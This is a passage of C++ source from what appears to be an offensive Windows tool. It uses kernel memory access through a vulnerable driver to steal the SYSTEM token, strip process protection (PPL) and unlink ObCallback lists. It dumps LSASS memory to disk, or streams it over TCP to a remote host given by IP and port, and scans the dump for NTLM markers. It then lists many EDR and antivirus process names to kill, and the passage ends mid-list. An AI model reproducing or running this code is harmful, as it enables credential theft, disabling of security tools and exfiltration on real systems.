                printf("[*] Protection scanned to 0x%llX (was 0x%llX)\n", s, g_off.Protection);
                g_off.Protection = s;
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Kernel base + System EPROCESS
// ---------------------------------------------------------------------------
static QWORD PsISPOffset() {
    HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    FARPROC p = GetProcAddress(ntos, "PsInitialSystemProcess");
    QWORD off = p ? ((QWORD)p - (QWORD)ntos) : 0;
    FreeLibrary(ntos);
    return off;
}

struct KernelBase { QWORD ntosBase; QWORD systemEproc; };

static KernelBase GetKernelBase() {
    KernelBase r{};
    LPVOID drvs[1024];
    DWORD cb;
    if (EnumDeviceDrivers(drvs, sizeof(drvs), &cb))
        r.ntosBase = (QWORD)drvs[0];
    if (!r.ntosBase) return r;
    QWORD sysOff = PsISPOffset();
    if (!sysOff) return r;
    r.systemEproc = KReadQword(r.ntosBase + sysOff);
    return r;
}

// ---------------------------------------------------------------------------
// Process walker
// ---------------------------------------------------------------------------
static QWORD FindEprocessByPid(QWORD sysEproc, DWORD pid, char name[16]) {
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep  = flink - g_off.ActiveProcessLinks;
        QWORD cur = KReadQword(ep + g_off.UniqueProcessId);
        if ((DWORD)cur == pid) {
            if (name) { KRead(ep + g_off.ImageFileName, name, 15); name[15] = 0; }
            return ep;
        }
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
    return 0;
}

static QWORD FindEprocessByName(QWORD sysEproc, const char* target) {
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep = flink - g_off.ActiveProcessLinks;
        char nm[16]{};
        KRead(ep + g_off.ImageFileName, nm, 15);
        if (_stricmp(nm, target) == 0) return ep;
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Token steal
// ---------------------------------------------------------------------------
static bool TokenSteal(QWORD sysEproc, DWORD targetPid) {
    QWORD sysToken = KReadQword(sysEproc + g_off.Token) & ~0xFULL;
    if (!sysToken) { printf("[-] Failed to read SYSTEM token\n"); return false; }
    printf("[+] SYSTEM token: 0x%llX\n", sysToken);

    char nm[16]{};
    QWORD targetEp = FindEprocessByPid(sysEproc, targetPid, nm);
    if (!targetEp) { printf("[-] Target PID %lu not found\n", targetPid); return false; }
    printf("[+] Target EPROCESS 0x%llX (%s)\n", targetEp, nm);

    QWORD curToken = KReadQword(targetEp + g_off.Token);
    printf("[*] Current token: 0x%llX -> stealing SYSTEM token\n", curToken);

    QWORD newToken = sysToken | (curToken & 0xF);
    if (!KWrite(targetEp + g_off.Token, &newToken, 8)) {
        printf("[-] KWrite token failed\n"); return false;
    }
    QWORD check = KReadQword(targetEp + g_off.Token);
    printf("[!!!] Token written: 0x%llX (verify: 0x%llX)\n", newToken, check);
    return true;
}

// ---------------------------------------------------------------------------
// ntoskrnl export resolver
// ---------------------------------------------------------------------------
static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
    DWORD peOff = 0;
    KRead(ntosBase + 0x3C, &peOff, 4);
    if (!peOff || peOff > 0x1000) return 0;

    DWORD eDirRva = 0, numNames = 0, numFuncs = 0;
    DWORD namesRVA = 0, funcsRVA = 0, ordsRVA = 0;
    KRead(ntosBase + peOff + 0x88, &eDirRva, 4);
    if (!eDirRva) return 0;
    QWORD eDir = ntosBase + eDirRva;
    KRead(eDir + 0x14, &numFuncs,  4);
    KRead(eDir + 0x18, &numNames,  4);
    KRead(eDir + 0x1C, &funcsRVA,  4);
    KRead(eDir + 0x20, &namesRVA,  4);
    KRead(eDir + 0x24, &ordsRVA,   4);

    size_t targLen = strlen(symName);
    for (DWORD i = 0; i < numNames && i < 100000; i++) {
        DWORD nameRVA = 0;
        KRead(ntosBase + namesRVA + (QWORD)i * 4, &nameRVA, 4);
        if (!nameRVA) continue;
        char buf[256]{};
        KRead(ntosBase + nameRVA, buf, (DWORD)std::min(targLen + 2, (size_t)255));
        if (memcmp(buf, symName, targLen) == 0 && buf[targLen] == 0) {
            WORD ord = 0;
            KRead(ntosBase + ordsRVA + (QWORD)i * 2, &ord, 2);
            DWORD funcRVA = 0;
            KRead(ntosBase + funcsRVA + (QWORD)ord * 4, &funcRVA, 4);
            return ntosBase + funcRVA;
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// ObCallback operations
// ---------------------------------------------------------------------------
static void UnlinkCallbackList(const char* typeName, QWORD listHead) {
    QWORD flink = KReadQword(listHead);
    if (flink == listHead || !flink) {
        printf("[+] %s CallbackList already empty\n", typeName);
        return;
    }
    QWORD entry = flink;
    int seen = 0;
    while (entry && entry != listHead && seen < 64) {
        QWORD pre  = KReadQword(entry + 0x28);
        QWORD post = KReadQword(entry + 0x30);
        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n",
               typeName, seen, entry, pre, post);
        entry = KReadQword(entry);
        seen++;
    }
    printf("[*] Unlinking %d %s callback(s)...\n", seen, typeName);
    if (!KWrite(listHead,     &listHead, 8) ||
        !KWrite(listHead + 8, &listHead, 8)) {
        printf("[-] KWrite %s CallbackList unlink failed\n", typeName);
        return;
    }
    printf("[+] %s ObCallback list unlinked (%d entries)\n", typeName, seen);
}

static void ListCallbackList(const char* typeName, QWORD listHead) {
    QWORD flink = KReadQword(listHead);
    if (flink == listHead || !flink) {
        printf("[*] %s CallbackList: empty\n", typeName);
        return;
    }
    QWORD entry = flink;
    int seen = 0;
    while (entry && entry != listHead && seen < 64) {
        QWORD pre  = KReadQword(entry + 0x28);
        QWORD post = KReadQword(entry + 0x30);
        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n",
               typeName, seen, entry, pre, post);
        entry = KReadQword(entry);
        seen++;
    }
    printf("[*] %s CallbackList: %d registration(s) found\n", typeName, seen);
}

static bool PatchObCallbacks(QWORD ntosBase) {
    QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
    if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
    QWORD procObjType = KReadQword(psProcTypeAddr);
    if (!procObjType) { printf("[-] *PsProcessType is NULL\n"); return false; }
    printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
    UnlinkCallbackList("Process", procObjType + 0xC8);

    QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
    if (psThreadTypeAddr) {
        QWORD threadObjType = KReadQword(psThreadTypeAddr);
        if (threadObjType) {
            printf("[*] OBJECT_TYPE (Thread): 0x%llX\n", threadObjType);
            UnlinkCallbackList("Thread", threadObjType + 0xC8);
        }
    }
    return true;
}

static bool ListCallbacks(QWORD ntosBase) {
    QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
    if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
    QWORD procObjType = KReadQword(psProcTypeAddr);
    if (!procObjType) { printf("[-] *PsProcessType is NULL\n"); return false; }
    printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
    ListCallbackList("Process", procObjType + 0xC8);

    QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
    if (psThreadTypeAddr) {
        QWORD threadObjType = KReadQword(psThreadTypeAddr);
        if (threadObjType) {
            printf("[*] OBJECT_TYPE (Thread): 0x%llX\n", threadObjType);
            ListCallbackList("Thread", threadObjType + 0xC8);
        }
    }
    return true;
}

// ---------------------------------------------------------------------------
// CR3-based physical process memory access (for --dump-kernel)
// ---------------------------------------------------------------------------
static QWORD Cr3VaToPa(QWORD cr3, QWORD va) {
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0; BiosTool_ReadPhys((PVOID)((cr3 & ~0xFFFULL) + pml4_idx * 8), 8, &pml4e);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = 0; BiosTool_ReadPhys((PVOID)((pml4e & ~0xFFFULL) + pdpt_idx * 8), 8, &pdpte);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    QWORD pde = 0; BiosTool_ReadPhys((PVOID)((pdpte & ~0xFFFULL) + pd_idx * 8), 8, &pde);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    QWORD pte = 0; BiosTool_ReadPhys((PVOID)((pde & ~0xFFFULL) + pt_idx * 8), 8, &pte);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | offset;
}

static bool PhysReadProcessMemory(QWORD cr3, QWORD va, PVOID buf, SIZE_T size) {
    auto pOut = (PUCHAR)buf;
    while (size > 0) {
        QWORD pageOff = va & 0xFFF;
        QWORD chunk   = std::min(size, (SIZE_T)(0x1000 - pageOff));
        QWORD pa = Cr3VaToPa(cr3, va);
        if (!pa) {
            memset(pOut, 0, chunk);
        } else {
            if (!BiosTool_ReadPhys((PVOID)pa, chunk, pOut)) return false;
        }
        va   += chunk;
        pOut += chunk;
        size -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// PPL operations
// ---------------------------------------------------------------------------
struct PplResult { bool ok; QWORD eproc; BYTE before; char name[16]; };

static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun, bool clearSigLevel = false) {
    PplResult r{};
    r.eproc = FindEprocessByPid(sysEproc, pid, r.name);
    if (!r.eproc) { printf("[-] PID %lu not found\n", pid); return r; }
    printf("[+] Target EPROCESS: 0x%llX (%s)\n", r.eproc, r.name);

    ScanAndFixOffsets(r.eproc, pid);

    BYTE sigLevel = 0, secSigLevel = 0;
    KRead(r.eproc + g_off.Protection - 2, &sigLevel,    1);
    KRead(r.eproc + g_off.Protection - 1, &secSigLevel, 1);
    KRead(r.eproc + g_off.Protection,     &r.before,    1);
    printf("[*] SignatureLevel=0x%02X  SectionSignatureLevel=0x%02X  Protection=0x%02X\n",
           sigLevel, secSigLevel, r.before);

    if (dryRun) { printf("[dry-run] Skipping write\n"); r.ok = true; return r; }
    if (r.before == 0 && !clearSigLevel) { printf("[!] Protection already 0x00\n"); r.ok = true; return r; }

    if (clearSigLevel) {
        BYTE zero = 0;
        KWrite(r.eproc + g_off.Protection - 2, &zero, 1);
        KWrite(r.eproc + g_off.Protection - 1, &zero, 1);
    }

    BYTE zero = 0;
    if (!KWrite(r.eproc + g_off.Protection, &zero, 1)) {
        printf("[-] KWrite Protection failed (%lu)\n", GetLastError()); return r;
    }
    BYTE after = 0xFF;
    KRead(r.eproc + g_off.Protection, &after, 1);
    if (after != 0) { printf("[-] Write issued but Protection=0x%02X\n", after); return r; }
    printf("[!!!] Protection byte cleared (0x%02X -> 0x00)\n", r.before);
    r.ok = true;
    return r;
}

// Restore all three protection bytes (used after MiniDumpWriteDump).
static void RestorePpl(QWORD eproc, BYTE protection, BYTE sigLevel, BYTE secSigLevel) {
    KWrite(eproc + g_off.Protection - 2, &sigLevel,    1);
    KWrite(eproc + g_off.Protection - 1, &secSigLevel, 1);
    KWrite(eproc + g_off.Protection,     &protection,  1);
    BYTE check = 0;
    KRead(eproc + g_off.Protection, &check, 1);
    printf("[*] Protection restored: 0x%02X (verify: 0x%02X)\n", protection, check);
}

// Set PPL: type=Protected(2), signer=WinSystem(6) -> Protection byte = 0x62
static bool PplAdd(QWORD sysEproc, DWORD pid) {
    char nm[16]{};
    QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
    if (!ep) { printf("[-] PID %lu not found\n", pid); return false; }
    printf("[+] Target EPROCESS: 0x%llX (%s)\n", ep, nm);

    BYTE cur = 0; KRead(ep + g_off.Protection, &cur, 1);
    printf("[*] Current Protection: 0x%02X\n", cur);

    // PS_PROTECTION: Level = (Signer<<4) | (Type) = (6<<4) | 2 = 0x62
    BYTE ppl = 0x62;
    if (!KWrite(ep + g_off.Protection, &ppl, 1)) {
        printf("[-] KWrite Protection failed\n"); return false;
    }
    BYTE check = 0; KRead(ep + g_off.Protection, &check, 1);
    printf("[+] Protection set to 0x%02X (verify: 0x%02X) - PsProtectedTypeProtected/WinSystem\n", ppl, check);
    return (check == ppl);
}

// ---------------------------------------------------------------------------
// Process finder
// ---------------------------------------------------------------------------
static DWORD FindPidByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        if (_stricmp(nm, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

// ---------------------------------------------------------------------------
// LSASS dump - MiniDumpWriteDump path (deprecated: use --dump-rpm instead)
// ---------------------------------------------------------------------------
static bool DumpLsass(DWORD pid, const char* outPath, bool noXor, BYTE xorKey = 0x55) {
    EnablePrivilege("SeDebugPrivilege");

    typedef NTSTATUS(WINAPI* NtSP_t)(HANDLE);
    auto NtSP = (NtSP_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendProcess");
    auto NtRP = (NtSP_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeProcess");

    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess %lu failed (%lu)\n", pid, GetLastError()); return false; }

    if (NtSP) { NTSTATUS st = NtSP(hTarget); printf("[*] NtSuspendProcess: 0x%lX\n", (ULONG)st); }

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, FILE_SHARE_READ, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile %s failed (%lu)\n", outPath, GetLastError());
        if (NtRP) NtRP(hTarget);
        CloseHandle(hTarget);
        return false;
    }

    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
        MiniDumpWithFullMemory | MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules | MiniDumpWithFullMemoryInfo |
        MiniDumpWithThreadInfo | MiniDumpWithTokenInformation);

    printf("[*] MiniDumpWriteDump PID=%lu...\n", pid);
    BOOL ok = MiniDumpWriteDump(hTarget, pid, hOut, dumpType, nullptr, nullptr, nullptr);
    DWORD err = GetLastError();

    FlushFileBuffers(hOut);
    CloseHandle(hOut);
    if (NtRP) NtRP(hTarget);
    CloseHandle(hTarget);

    if (!ok) { printf("[-] MiniDumpWriteDump failed, GLE=%lu\n", err); return false; }

    LARGE_INTEGER sz{};
    HANDLE hCheck = CreateFileA(outPath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                                nullptr, OPEN_EXISTING, 0, nullptr);
    if (hCheck != INVALID_HANDLE_VALUE) { GetFileSizeEx(hCheck, &sz); CloseHandle(hCheck); }
    printf("[!!!] Dump written to %s (%lld bytes)\n", outPath, sz.QuadPart);

    if (!noXor && sz.QuadPart > 0) {
        HANDLE hXor = CreateFileA(outPath, GENERIC_READ|GENERIC_WRITE, 0,
                                  nullptr, OPEN_EXISTING, 0, nullptr);
        if (hXor != INVALID_HANDLE_VALUE) {
            const DWORD CHUNK = 1024*1024;
            std::vector<BYTE> xbuf(CHUNK);
            DWORD got = 0;
            LARGE_INTEGER pos{};
            SetFilePointerEx(hXor, pos, nullptr, FILE_BEGIN);
            while (ReadFile(hXor, xbuf.data(), CHUNK, &got, nullptr) && got > 0) {
                for (DWORD i = 0; i < got; i++) xbuf[i] ^= xorKey;
                LARGE_INTEGER back{}; back.QuadPart = -(LONGLONG)got;
                SetFilePointerEx(hXor, back, nullptr, FILE_CURRENT);
                DWORD w = 0; WriteFile(hXor, xbuf.data(), got, &w, nullptr);
            }
            CloseHandle(hXor);
            printf("[*] Output XOR'd with 0x%02X\n", xorKey);
        }
    }

    return sz.QuadPart > 0;
}

// ---------------------------------------------------------------------------
// LSASS dump - ReadProcessMemory path
// ---------------------------------------------------------------------------
static bool DumpRpm(DWORD pid, const char* outPath) {
    EnablePrivilege("SeDebugPrivilege");
    HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess PROCESS_VM_READ failed (%lu)\n", GetLastError()); return false; }

    FILE* fOut = fopen(outPath, "wb");
    if (!fOut) { printf("[-] fopen %s failed\n", outPath); CloseHandle(hTarget); return false; }

    MEMORY_BASIC_INFORMATION mbi{};
    BYTE* addr = nullptr;
    SIZE_T totalBytes = 0, regions = 0;
    printf("[*] DumpRpm: scanning LSASS virtual memory...\n");
    while (VirtualQueryEx(hTarget, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            (mbi.Protect & PAGE_NOACCESS) == 0) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                QWORD base = (QWORD)mbi.BaseAddress;
                QWORD sz   = bytesRead;
                fwrite(&base, 8, 1, fOut);
                fwrite(&sz,   8, 1, fOut);
                fwrite(buf.data(), 1, bytesRead, fOut);
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)addr < (QWORD)mbi.BaseAddress) break;
    }
    fflush(fOut);
    fclose(fOut);
    CloseHandle(hTarget);
    printf("[*] DumpRpm: %zu regions, %zu bytes -> %s\n", regions, totalBytes, outPath);
    return totalBytes > 0;
}

// ---------------------------------------------------------------------------
// LSASS dump - TCP streaming (disk-free)
// ---------------------------------------------------------------------------
static bool DumpRpmTcp(DWORD pid, const char* recvIp, int recvPort) {
    EnablePrivilege("SeDebugPrivilege");
    HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess PROCESS_VM_READ failed (%lu)\n", GetLastError()); return false; }

    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup failed\n"); CloseHandle(hTarget); return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] socket() failed\n"); WSACleanup(); CloseHandle(hTarget); return false;
    }
    DWORD tv = 30000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((u_short)recvPort);
    inet_pton(AF_INET, recvIp, &sa.sin_addr);

    printf("[*] Connecting to %s:%d...\n", recvIp, recvPort);
    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        printf("[-] connect() failed (%d)\n", WSAGetLastError());
        closesocket(sock); WSACleanup(); CloseHandle(hTarget); return false;
    }
    printf("[+] Connected. Streaming LSASS memory...\n");

    MEMORY_BASIC_INFORMATION mbi{};
    BYTE* addr = nullptr;
    SIZE_T totalBytes = 0, regions = 0;

    auto sendAll = [&](const void* data, int len) -> bool {
        const char* p = (const char*)data;
        while (len > 0) {
            int sent = send(sock, p, len, 0);
            if (sent <= 0) return false;
            p += sent; len -= sent;
        }
        return true;
    };

    while (VirtualQueryEx(hTarget, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            (mbi.Protect & PAGE_NOACCESS) == 0) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                QWORD base = (QWORD)mbi.BaseAddress;
                QWORD sz   = bytesRead;
                if (!sendAll(&base, 8) || !sendAll(&sz, 8) || !sendAll(buf.data(), (int)bytesRead)) {
                    printf("[-] send() failed at region 0x%llX\n", base);
                    break;
                }
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)addr < (QWORD)mbi.BaseAddress) break;
    }

    closesocket(sock);
    WSACleanup();
    CloseHandle(hTarget);
    printf("[+] DumpRpmTcp: %zu regions, %zu bytes sent to %s:%d\n", regions, totalBytes, recvIp, recvPort);
    return totalBytes > 0;
}

// ---------------------------------------------------------------------------
// Kernel-direct dump via CR3 page walk
// ---------------------------------------------------------------------------
static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
    char nm[16]{};
    QWORD lsassEp = FindEprocessByPid(sysEproc, pid, nm);
    if (!lsassEp) { printf("[-] LSASS EPROCESS not found\n"); return false; }

    QWORD cr3 = KReadQword(lsassEp + 0x28);
    printf("[*] LSASS EPROCESS: 0x%llX  CR3: 0x%llX\n", lsassEp, cr3);
    if (!cr3) { printf("[-] CR3 read returned 0\n"); return false; }

    // Try to find user-mode CR3 (KPTI shadow PML4)
    static const DWORD ucrOffsets[] = { 0x388, 0x280, 0x3B8, 0x028 };
    QWORD useCr3 = cr3;
    for (DWORD off : ucrOffsets) {
        QWORD cand = KReadQword(lsassEp + off);
        if (!cand || cand == cr3) continue;
        QWORD candBase = cand & ~0xFFFULL;
        QWORD pml4_0 = 0;
        if (BiosTool_ReadPhys((PVOID)candBase, 8, &pml4_0) && (pml4_0 & 1)) {
            printf("[*] UserDirectoryTableBase @ 0x%lX = 0x%llX\n", off, cand);
            useCr3 = cand;
            break;
        }
    }
    if (useCr3 == cr3)
        printf("[!] Using kernel CR3 - user-mode pages may not all translate\n");

    // Need a query handle to enumerate regions
    typedef NTSTATUS(NTAPI* NtQVM_t)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtQVM = (NtQVM_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
    if (!NtQVM) { printf("[-] NtQueryVirtualMemory not found\n"); return false; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    }
    if (!hProc) { printf("[-] Cannot open LSASS for query (%lu)\n", GetLastError()); return false; }

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return false; }

    struct { char magic[8]; QWORD va; QWORD size; } regionHdr;
    memcpy(regionHdr.magic, "CASCRAW\0", 8);

    QWORD addr = 0x10000;
    MEMORY_BASIC_INFORMATION mbi{};
    SIZE_T retLen = 0;
    int regions = 0, hits = 0;
    const BYTE needle[] = { 'N',0,'T',0,'L',0,'M',0 };

    bool earlyStop = false;
    while (!earlyStop && addr < 0x7FFFFFFFFFFF00ULL) {
        NTSTATUS st = NtQVM(hProc, (PVOID)addr, 0, &mbi, sizeof(mbi), &retLen);
        if (!NT_SUCCESS(st)) break;
        // Include MEM_PRIVATE, MEM_MAPPED, and MEM_IMAGE - all committed readable regions
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READ |
                            PAGE_EXECUTE_READWRITE | PAGE_READONLY)) &&
            !(mbi.Protect & PAGE_NOACCESS) && !(mbi.Protect & PAGE_GUARD)) {
            SIZE_T rsz = mbi.RegionSize;
            if (rsz > 16ULL * 1024 * 1024) rsz = 16ULL * 1024 * 1024;
            std::vector<BYTE> rbuf(rsz, 0);
            if (PhysReadProcessMemory(useCr3, (QWORD)mbi.BaseAddress, rbuf.data(), rsz)) {
                regionHdr.va   = (QWORD)mbi.BaseAddress;
                regionHdr.size = rsz;
                DWORD w = 0;
                WriteFile(hOut, &regionHdr, sizeof(regionHdr), &w, nullptr);
                WriteFile(hOut, rbuf.data(), (DWORD)rsz, &w, nullptr);
                regions++;
                for (SIZE_T i = 0; i + sizeof(needle) < rsz && !earlyStop; i++) {
                    if (memcmp(&rbuf[i], needle, sizeof(needle)) == 0) {
                        hits++;
                        printf("[+] NTLM marker at LSASS VA 0x%llX\n",
                               (QWORD)mbi.BaseAddress + i);
                        if (hits > 64) earlyStop = true;
                    }
                }
            }
        }
        addr = (QWORD)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(hProc);
    CloseHandle(hOut);
    printf("[+] Kernel-direct dump: %d regions, %d NTLM markers -> %s\n",
           regions, hits, outPath);
    return regions > 0;
}

// ---------------------------------------------------------------------------
// EDR kill - full process list (merged from UsingBYOVD)
// ---------------------------------------------------------------------------
static const char* kEdrProcs[] = {
    // Acronis
    "acronis_agent.exe","BackupAndRecoveryAgent.exe","managementagenthost.exe","mms.exe",
    // AlienVault
    "alienvault-agent.exe","osqueryd.exe",
    // Avast
    "afwServ.exe","aswEngSrv.exe","aswidsagent.exe","aswToolsSvc.exe",
    "AvastSvc.exe","AvastUI.exe","bccavsvc.exe","wsc_proxy.exe",
    // AVG
    "AVGUI.exe","AVGSvc.exe","avgnt.exe","avgsvca.exe","avgToolsSvc.exe",
    // Binary Defense
    "BinaryDefenseAgent.exe",
    // Bitdefender
    "Arrakis3.exe","BDAvScanner.exe","BDFsTray.exe","BDFileServer.exe","BDLived2.exe",
    "BDLogger.exe","BDScheduler.exe","BDStatistics.exe","bdagent.exe","bdemsrv.exe",
    "bdntwrk.exe","bdredline.exe","bdregsvr2.exe","bdservicehost.exe",
    // Blumira
    "BlumiraAgent.exe",
    // Carbon Black
    "cb.exe","cbcomms.exe","cbdefense.exe","carbonsensor.exe","RepMgr.exe",
    // Cisco Talos
    "cfrutil.exe","cisco_amp_connector.exe","immunet.exe",
    // CrowdStrike
    "CSFalconContainer.exe","CSFalconService.exe","CSFalconUI.exe",
    "csfalcondataprotect.exe","REPRSVC.EXE",
    // Cynet
    "CynetEPS.exe","CynetMS.exe","CynetSvc.exe",
    // Cybereason
    "ActiveConsole.exe","cybereason.exe","CybereasonActiveProbe.exe","CybereasonCR.exe",
    // Cylance / BlackBerry
    "CylanceSvc.exe",
    // Darktrace
    "DarktraceTSA.exe",
    // Deep Instinct
    "DeepInstinct.exe","DeepInstinctService.exe","DIAgentService.exe",
    // Elastic
    "elastic-endpoint.exe","elastic-agent.exe","a2guard.exe","a2service.exe",
    // ESET
    "eamonm.exe","eamsi.exe","ecls.exe","efwd.exe","egui.exe","eguiProxy.exe",
    "ekrn.exe","ekrnEpfw.exe","ERAAgent.exe","EraAgentSvc.exe",
    // Fortinet
    "firesvc.exe","firetray.exe","FortiTray.exe","fortiedr.exe",
    // Heimdal
    "HeimdalsecurityAgent.exe",
    // Huntress
    "HuntressAgent.exe","HuntressRMM.exe",
    // Kaspersky
    "avp.exe","avpsus.exe","avpui.exe","kavfs.exe","kavfsscs.exe","kavfswh.exe",
    "kavfswp.exe","kavtray.exe","klactprx.exe","klcsldcl.exe","klcsweb.exe",
    "klnagent.exe","klnagchk.exe","klscctl.exe","klserver.exe","klwtblfs.exe",
    "kpf4ss.exe","ksde.exe","ksdeui.exe","vapm.exe",
    // McAfee / Trellix
    "masvc.exe","macmnsvc.exe","McAfeeAgent.exe","mcshield.exe","mfeann.exe",
    "mfevtps.exe","mfetp.exe","mfeepehost.exe","mfefire.exe","mfemactl.exe",
    "mfemacsvc.exe","mfemgr.exe","mfemms.exe","MgntSvc.exe","tepfsvc.exe",
    // Microsoft Defender
    "MSASCui.exe","MSASCuiL.exe","MpDefenderCoreService.exe","MsMpEng.exe",
    "MsMpSvc.exe","MsSense.exe","msseces.exe","NisSrv.exe","SecurityHealthService.exe",
    "SenseCncProxy.exe","SenseIR.exe","SenseNdr.exe","SenseSampleUploader.exe",
    "smartscreen.exe","windefend.exe","WinDefend.exe",
    // Morphisec
    "MorphisecService.exe",
    // Norton / Symantec
    "ccApp.exe","ccSvcHst.exe","ns.exe","nsservice.exe","nortonsecurity.exe",
    "rtvscan.exe","SepMasterService.exe","sepWscSvc64.exe","smc.exe","SmcGui.exe",
    // OSSEC / Wazuh
    "ossec-agent.exe","wazuh-agent.exe",
    // Palo Alto / Cortex
    "cortexService.exe","trapsagent.exe","trapsd.exe","Traps.exe",
    // Qualys
    "qualys-cloud-agent.exe","QualysAgent.exe",
    // Rapid7
    "ir_agent.exe","rapid7_endpoint.exe",
    // Red Canary
    "RedCanaryAgent.exe",
    // Sangfor
    "SangforAgent.exe","SangforEDR.exe","SangforMonitor.exe","SangforProtect.exe","SangforService.exe",
    // SentinelOne
    "Sentinel.exe","SentinelAgent.exe","SentinelAgentWorker.exe","SentinelCtl.exe",
    "SentinelHelperService.exe","SentinelMemoryScanner.exe","SentinelServiceHost.exe",
    "SentinelStaticEngine.exe","SentinelUI.exe",
    // SonicWall
